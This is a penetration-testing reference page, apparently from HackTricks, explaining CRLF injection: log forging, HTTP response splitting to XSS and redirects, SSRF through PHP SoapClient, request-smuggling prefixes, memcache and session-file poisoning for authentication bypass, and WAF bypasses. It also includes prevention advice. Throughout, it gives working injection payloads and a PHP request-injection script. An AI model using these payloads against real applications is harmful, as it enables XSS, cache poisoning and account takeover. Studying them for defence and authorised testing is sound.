_body: "# CRLF (%0D%0A) Injection\n\n{{#include ../banners/hacktricks-training.md}}\n\n### CRLF\n\nCarriage Return (CR) and\
  \ Line Feed (LF), collectively known as CRLF, are special character sequences used in the HTTP protocol to denote the end\
  \ of a line or the start of a new one. Web servers and browsers use CRLF to distinguish between HTTP headers and the body\
  \ of a response. These characters are universally employed in HTTP/1.1 communications across various web server types, such\
  \ as Apache and Microsoft IIS.\n\n### CRLF Injection Vulnerability\n\nCRLF injection involves the insertion of CR and LF\
  \ characters into user-supplied input. This action misleads the server, application, or user into interpreting the injected\
  \ sequence as the end of one response and the beginning of another. While these characters are not inherently harmful, their\
  \ misuse can lead to HTTP response splitting and other malicious activities.\n\n### Example: CRLF Injection in a Log File\n\
  \n[Example from here](https://www.invicti.com/blog/web-security/crlf-http-header/)\n\nConsider a log file in an admin panel\
  \ that follows the format: `IP - Time - Visited Path`. A typical entry might look like:\n\n```\n123.123.123.123 - 08:15\
  \ - /index.php?page=home\n```\n\nAn attacker can exploit a CRLF injection to manipulate this log. By injecting CRLF characters\
  \ into the HTTP request, the attacker can alter the output stream and fabricate log entries. For instance, an injected sequence\
  \ might transform the log entry into:\n\n```\n/index.php?page=home&%0d%0a127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit\n\
  ```\n\nHere, `%0d` and `%0a` represent the URL-encoded forms of CR and LF. Post-attack, the log would misleadingly display:\n\
  \n```\nIP - Time - Visited Path\n\n123.123.123.123 - 08:15 - /index.php?page=home&\n127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit\n\
  ```\n\nThe attacker thus cloaks their malicious activities by making it appear as if the localhost (an entity typically\
  \ trusted within the server environment) performed the actions. The server interprets the part of the query starting with\
  \ `%0d%0a` as a single parameter, while the `restrictedaction` parameter is parsed as another, separate input. The manipulated\
  \ query effectively mimics a legitimate administrative command: `/index.php?page=home&restrictedaction=edit`\n\n### HTTP\
  \ Response Splitting\n\n#### Description\n\nHTTP Response Splitting is a security vulnerability that arises when an attacker\
  \ exploits the structure of HTTP responses. This structure separates headers from the body using a specific character sequence,\
  \ Carriage Return (CR) followed by Line Feed (LF), collectively termed as CRLF. If an attacker manages to insert a CRLF\
  \ sequence into a response header, they can effectively manipulate the subsequent response content. This type of manipulation\
  \ can lead to severe security issues, notably Cross-site Scripting (XSS).\n\n#### XSS through HTTP Response Splitting\n\n\
  1. The application sets a custom header like this: `X-Custom-Header: UserInput`\n2. The application fetches the value for\
  \ `UserInput` from a query parameter, say \"user_input\". In scenarios lacking proper input validation and encoding, an\
  \ attacker can craft a payload that includes the CRLF sequence, followed by malicious content.\n3. An attacker crafts a\
  \ URL with a specially crafted 'user_input': `?user_input=Value%0d%0a%0d%0a<script>alert('XSS')</script>`\n   - In this\
  \ URL, `%0d%0a%0d%0a` is the URL-encoded form of CRLFCRLF. It tricks the server into inserting a CRLF sequence, making the\
  \ server treat the subsequent part as the response body.\n4. The server reflects the attacker's input in the response header,\
  \ leading to an unintended response structure where the malicious script is interpreted by the browser as part of the response\
  \ body.\n\n#### An example of HTTP Response Splitting leading to Redirect\n\nFrom [https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62](https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62)\n\
  \nBrowser to:\n\n```\n/%0d%0aLocation:%20http://myweb.com\n```\n\nAnd the server responses with the header:\n\n```\nLocation:\
  \ http://myweb.com\n```\n\n**Other example: (from** [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)**)**\n\
  \n```\nhttp://www.example.com/somepage.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E\n\
  ```\n\n#### In URL Path\n\nYou can send the payload **inside the URL path** to control the **response** from the server\
  \ (example from [here](https://hackerone.com/reports/192667)):\n\n```\nhttp://stagecafrstore.starbucks.com/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E\n\

  ```\n\nCheck more examples in:\n\n\n{{#ref}}\nhttps://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/crlf.md\n\
  {{#endref}}\n\n### HTTP Header Injection\n\nHTTP Header Injection, often exploited through CRLF (Carriage Return and Line\
  \ Feed) injection, allows attackers to insert HTTP headers. This can undermine security mechanisms such as XSS (Cross-Site\
  \ Scripting) filters or the SOP (Same-Origin Policy), potentially leading to unauthorized access to sensitive data, such\
  \ as CSRF tokens, or the manipulation of user sessions through cookie planting.\n\n#### Exploiting CORS via HTTP Header\
  \ Injection\n\nAn attacker can inject HTTP headers to enable CORS (Cross-Origin Resource Sharing), bypassing the restrictions\
  \ imposed by SOP. This breach allows scripts from malicious origins to interact with resources from a different origin,\
  \ potentially accessing protected data.\n\n#### SSRF and HTTP Request Injection via CRLF\n\nCRLF injection can be utilized\
  \ to craft and inject an entirely new HTTP request. A notable example of this is the vulnerability in PHP's `SoapClient`\
  \ class, specifically within the `user_agent` parameter. By manipulating this parameter, an attacker can insert additional\
  \ headers and body content, or even inject a new HTTP request entirely. Below is a PHP example demonstrating this exploitation:\n\
  \n```php\n$target = 'http://127.0.0.1:9090/test';\n$post_string = 'variable=post value';\n$crlf = array(\n    'POST /proxy\
  \ HTTP/1.1',\n    'Host: local.host.htb',\n    'Cookie: PHPSESSID=[PHPSESSID]',\n    'Content-Type: application/x-www-form-urlencoded',\n\
  \    'Content-Length: '.(string)strlen($post_string),\n    \"\\r\\n\",\n    $post_string\n);\n\n$client = new SoapClient(null,\n\
  \    array(\n        'uri'=>$target,\n        'location'=>$target,\n        'user_agent'=>\"IGN\\r\\n\\r\\n\".join(\"\\\
  r\\n\",$crlf)\n    )\n);\n\n# Put a netcat listener on port 9090\n$client->__soapCall(\"test\", []);\n```\n\n### Header\
  \ Injection to Request Smuggling\n\nFor more info about this technique and potential problems [**check the original source**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning).\n\
  \nYou can inject essential headers to ensure the **back-end keeps the connection open** after responding to the initial\
  \ request:\n\n```\nGET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0a HTTP/1.1\n```\n\n\
  Afterward, a second request can be specified. This scenario typically involves [HTTP request smuggling](http-request-smuggling/),\
  \ a technique where extra headers or body elements appended by the server post-injection can lead to various security exploits.\n\
  \n**Exploitation:**\n\n1. **Malicious Prefix Injection**: This method involves poisoning the next user's request or a web\
  \ cache by specifying a malicious prefix. An example of this is:\n\n`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/redirplz%20HTTP/1.1%0d%0aHost:%20oastify.com%0d%0a%0d%0aContent-Length:%2050%0d%0a%0d%0a\
  \ HTTP/1.1`\n\n2. **Crafting a Prefix for Response Queue Poisoning**: This approach involves creating a prefix that, when\
  \ combined with trailing junk, forms a complete second request. This can trigger response queue poisoning. An example is:\n\
  \n`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aFoo:%20bar\
  \ HTTP/1.1`\n\n### Memcache Injection\n\nMemcache is a **key-value store that uses a clear text protocol**. More info in:\n\
  \n\n{{#ref}}\n../network-services-pentesting/11211-memcache/\n{{#endref}}\n\n**For the full information read the**[ **original\
  \ writeup**](https://www.sonarsource.com/blog/zimbra-mail-stealing-clear-text-credentials-via-memcache-injection/)\n\nIf\
  \ a platform is taking **data from an HTTP request and using it without sanitizing** it to perform **requests** to a **memcache**\
  \ server, an attacker could abuse this behaviour to **inject new memcache commands**.\n\nFor example, in the original discovered\
  \ vuln, cache keys were used to return the IP and port a user shuold connect to, and attackers were able to **inject memcache\
  \ comands** that would **poison** the **cache to send the vistims details** (usrnames and passwords included) to the attacker\
  \ servers:\n\n<figure><img src=\"../images/image (659).png\" alt=\"https://assets-eu-01.kc-usercontent.com/d0f02280-9dfb-0116-f970-137d713003b6/ba72cd16-2ca0-447b-aa70-5cde302a0b88/body-578d9f9f-1977-4e34-841c-ad870492328f_10.png?w=1322&h=178&auto=format&fit=crop\"\
  ><figcaption></figcaption></figure>\n\nMoreover, researchers also discovered that they could desync the memcache responses\
  \ to send the attackers ip and ports to users whose email the attacker didn't know:\n\n<figure><img src=\"../images/image\
  \ (637).png\" alt=\"https://assets-eu-01.kc-usercontent.com/d0f02280-9dfb-0116-f970-137d713003b6/c6c1f3c4-d244-4bd9-93f7-2c88f139acfa/body-3f9ceeb9-3d6b-4867-a23f-e0e50a46a2e9_14.png?w=1322&h=506&auto=format&fit=crop\"\
  ><figcaption></figcaption></figure>\n\n### Pre-auth Session File Poisoning via CRLF\n\nSome applications **persist session\
  \ state before authentication completes** and later **reload the same session from disk** after additional requests. If\
  \ attacker-controlled values from **headers**, **cookies**, or login parameters are written into that session file **without\
  \ stripping `\\r` / `\\n`**, CRLF injection can become an **authentication bypass** instead of just response splitting.\n\
  \nTypical exploitation pattern:\n\n1. A failed or incomplete login **creates a pre-auth session file** on disk.\n2. The\
  \ attacker finds a field that is later written to the session store, commonly a **Basic Authorization** value, a **session\
  \ cookie subfield**, or another login-related attribute.\n3. If the product uses a **structured session identifier** or\
  \ cookie format, try **removing optional/expected segments** to force a weaker code path where attacker-controlled data\
  \ is **not encoded/encrypted** before being persisted.\n4. Inject raw CRLF so the serialized session becomes **multi-line**,\
  \ allowing creation of extra trusted entries such as:\n\n```text\nuser=root\ncp_security_token=/cpsess...\ntfa_verified=1\n\
  ```\n\n5. Trigger a **session reload / resume** path. If the parser trusts the poisoned session file, the attacker upgrades\
  \ a pre-auth session into an authenticated or privileged one.\n\nQuick notes for review and exploitation:\n\n- Check whether\
  \ the session store is **line-oriented** (`key=value` per line). These formats are especially sensitive to CRLF.\n- Compare\
  \ how the application handles a **freshly issued session cookie** versus a **malformed/truncated** version of the same cookie.\n\
  - If authentication is split across several requests, inspect whether the **same session identifier survives** from the\
  \ failed login into the later privileged request.\n- Newline injection into one field can be enough if the reload logic\
  \ later trusts **presence of keys** such as `user`, `role`, `successful_external_auth_with_timestamp`, or `tfa_verified`.\n\
  \nDetection / triage ideas:\n\n- Inspect pre-auth session files for **authenticated-only keys**.\n- Flag session files whose\
  \ `pass` or equivalent field became **multi-line**.\n- Correlate **failed-login origins** with later session records containing\
  \ valid security tokens or authenticated attributes.\n\n### How to Prevent CRLF / HTTP Header Injections in Web Applications\n\
  \nTo mitigate the risks of CRLF (Carriage Return and Line Feed) or HTTP Header Injections in web applications, the following\
  \ strategies are recommended:\n\n1. **Avoid Direct User Input in Response Headers:** The safest approach is to refrain from\
  \ incorporating user-supplied input directly into response headers.\n2. **Encode Special Characters:** If avoiding direct\
  \ user input is not feasible, ensure to employ a function dedicated to encoding special characters like CR (Carriage Return)\
  \ and LF (Line Feed). This practice prevents the possibility of CRLF injection.\n3. **Update Programming Language:** Regularly\
  \ update the programming language used in your web applications to the latest version. Opt for a version that inherently\
  \ disallows the injection of CR and LF characters within functions tasked with setting HTTP headers.\n\n### CHEATSHEET\n\

  \nThe last few years have produced several high-impact CRLF/HTTP header-injection bugs in widely-used server- and client-side\
  \ components. Reproducing and studying them locally is an excellent way of understanding real-world exploitation patterns.\n\
  \n| Year | Component | CVE / Advisory | Root cause | PoC highlight |\n|------|-----------|---------------|------------|---------------|\n\
  | 2024 | RestSharp (≥110.0.0 <110.2.0) | **CVE-2024-45302** | The `AddHeader()` helper did not sanitize CR/LF, allowing\
  \ construction of multiple request headers when RestSharp is used as an HTTP client inside back-end services. Down-stream\
  \ systems could be coerced into SSRF or request smuggling. | `client.AddHeader(\"X-Foo\",\"bar%0d%0aHost:evil\")` |\n| 2024\
  \ | Refit (≤ 7.2.101) | **CVE-2024-51501** | Header attributes on interface methods were copied verbatim into the request.\
  \ By embedding `%0d%0a`, attackers could add arbitrary headers or even a second request when Refit was used by server-side\
  \ worker jobs. | `[Headers(\"X: a%0d%0aContent-Length:0%0d%0a%0d%0aGET /admin HTTP/1.1\")]` |\n| 2023 | Apache APISIX Dashboard\
  \ | **GHSA-4h3j-f5x9-r6x3** | User-supplied `redirect` parameter was echoed into a `Location:` header without encoding,\
  \ enabling open redirect + cache poisoning. | `/login?redirect=%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>`\
  \ |\n\nThese bugs are important because they are triggered **inside application-level code** and not only at the web-server\
  \ edge. Any internal component that performs HTTP requests or sets response headers must therefore enforce CR/LF filtering.\n\
  \n### Advanced Unicode / Control-Character Bypasses\n\nModern WAF/rewriter stacks often strip literal `\\r`/`\\n` but forget\
  \ about other characters that many back-ends treat as line terminators. When CRLF is filtered, try:\n\n* `%E2%80%A8` (`U+2028`\
  \ – LINE SEPARATOR)\n* `%E2%80%A9` (`U+2029` – PARAGRAPH SEPARATOR)\n* `%C2%85`  (`U+0085` – NEXT LINE)\n\nSome Java, Python\
  \ and Go frameworks convert these to `\\n` during header parsing (see the 2023 Praetorian research). Combine them with classic\
  \ payloads:\n\n```\n/%0A%E2%80%A8Set-Cookie:%20admin=true\n```\n\nIf the filter normalises UTF-8 first, the control character\
  \ is turned into a regular line-feed and the injected header is accepted.\n\n### WAF Evasion via Duplicate `Content-Encoding`\
  \ Trick (2023)\n\nPraetorian researchers also showed that by injecting:\n\n```\n%0d%0aContent-Encoding:%20identity%0d%0aContent-Length:%2030%0d%0a\n\
  ```\n\ninto a reflected header, browsers will ignore the body supplied by the server and render attacker-supplied HTML that\
  \ follows, giving stored XSS even when the application’s own content is inert. Because `Content-Encoding: identity` is allowed\
  \ by RFC 9110, many reverse-proxies forward it unchanged.\n\n## Automatic Tools\n\n* [CRLFsuite](https://github.com/Raghavd3v/CRLFsuite)\
  \ – fast active scanner written in Go.\n* [crlfuzz](https://github.com/dwisiswant0/crlfuzz) – wordlist-based fuzzer that\
  \ supports Unicode newline payloads.\n* [crlfix](https://github.com/glebarez/crlfix) – 2024 utility that patches HTTP requests\
  \ generated by Go programs and can be used standalone to test internal services.\n\n## Brute-Force Detection List\n\n- [carlospolop/Auto_Wordlists\
